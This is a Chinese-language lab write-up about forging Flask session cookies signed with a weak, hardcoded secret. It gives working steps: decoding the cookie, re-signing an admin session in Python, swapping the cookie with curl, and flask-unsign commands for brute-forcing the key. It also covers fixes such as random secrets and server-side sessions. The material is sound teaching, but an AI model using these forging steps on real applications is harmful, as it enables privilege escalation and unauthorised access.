# 会话 cookie 伪造（Flask session 签名）

## 这一题在教什么

两个非常常见、但很多人一直搞混的概念：

1. **签名 ≠ 加密。** 签名只保证「没被改过」，不保证「看不了」。
   Flask 的 session cookie 里，数据段就是 base64 的明文 JSON。
2. **只要密钥可猜（或可拿到），签名就毫无意义。** 攻击者用同一个密钥签一张就行。

还有一个设计层面的问题：**权限判定到底该信谁。**
把 `admin: true` 放在客户端可读、可重签的地方，本身就是把门锁交给了对方。

## 漏洞在哪

`module.py` 两处：

```python
WEAK_SECRET = "vuln4all-demo-secret"   # 硬编码在源码里
app.secret_key = WEAK_SECRET
```

```python
if not session.get("admin"):           # 权限完全是 cookie 说了算
    return ...403
```

## 怎么打通

**一、先确认数据是明文**

登录后 dashboard 会打出 cookie 原始值。它长这样：

```
eyJ1c2VyIjoiYWxpY2UiLCJwbGFuIjoiZnJlZSIsImFkbWluIjpmYWxzZX0.aBcDeF.签名
```

把第一段拿去 base64 解码：

```bash
echo 'eyJ1c2VyIjoiYWxpY2Ui...' | base64 -d
# {"user":"alice","plan":"free","admin":false}
```

**明文。** 签名只防篡改，不防读取。

> 顺带：如果你能在**不解签名**的情况下读到内容，那说明敏感信息就不该放这里。

**二、找密钥**

这是开源靶场，源码就在你面前：`WEAK_SECRET = "vuln4all-demo-secret"`。

真实场景里密钥的来源通常是：

- 源码里硬编码（像这题）
- 弱值：`secret`、`changeme`、`mysecretkey`、`flask`、项目名
- 从没改过的模板默认值
- `.env` 泄露 / git 历史里翻出来的
- 从别的漏洞（路径穿越、备份文件泄露、`.git` 目录暴露）拿到的配置文件

**三、自己签一张**

用 Flask 自带的机制，不需要额外依赖：

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "vuln4all-demo-secret"
signer = SecureCookieSessionInterface().get_signing_serializer(app)
print(signer.dumps({"user": "mallory", "plan": "enterprise", "admin": True}))
```

**四、替换 cookie**

- 浏览器：开发者工具 → Application → Cookies → 改 `session` 的值 → 刷新
- curl：`curl -b 'session=<签出来的值>' 'http://.../admin'`

**真实渗透里用 flask-unsign 更省事：**

```bash
pipx install flask-unsign
flask-unsign --decode --cookie '<原 cookie>'                        # 无密钥，先读内容
flask-unsign --unsign --cookie '<原 cookie>' --wordlist secrets.txt # 字典爆破密钥
flask-unsign --sign --cookie '{"admin": true}' --secret 'xxx'       # 伪造
```

## 怎么修

**1. 密钥要真随机，并且从环境里来。**

```python
import os, secrets
app.secret_key = os.environ["SECRET_KEY"]     # 别给默认值，没配就起不来
# 生成：python -c "import secrets; print(secrets.token_hex(32))"
```

密钥泄露时要能轮换 —— 所以还要有「密钥版本」机制。

**2. 别把权限放在客户端。**

正确的做法是：**cookie 里只放一个不可猜的会话 ID**，真正的用户数据放服务端
（数据库 / Redis）。

```python
session["sid"] = secrets.token_urlsafe(32)    # cookie 里只有这个
# 服务端按 sid 查出 user / plan / admin
```

Flask 生态里对应的做法是 `Flask-Session` 的 `RedisSessionInterface`（服务端 session）。
**关键点：客户端只能提供「你是谁」，不能提供「你有什么权限」。**

**3. 权限必须在服务端每次校验时重新查。**

就算是服务端 session，也要防「用户改了套餐但 session 里的旧值还在」这种情况。

**4. 别在客户端存敏感字段。**
`user` 这种非敏感标识放 cookie 里问题不大；`admin`、`plan`、`balance`、`role`
这一类**永远不该来自客户端**。

## 顺手想想

- 如果 cookie 里的数据换成了密文（加密+签名），就安全了吗？
  （提示：想想密钥还是同一个、以及"能用"和"该用"的区别）
- `SecureCookieSessionInterface` 默认连过期时间都不管，谁负责让它过期？
  这会导致什么问题？
- 如果攻击者拿不到密钥，还能怎么打？
  （提示：crypto oracle、长度泄露、session fixation、以及最常见的——密钥太弱，爆破）
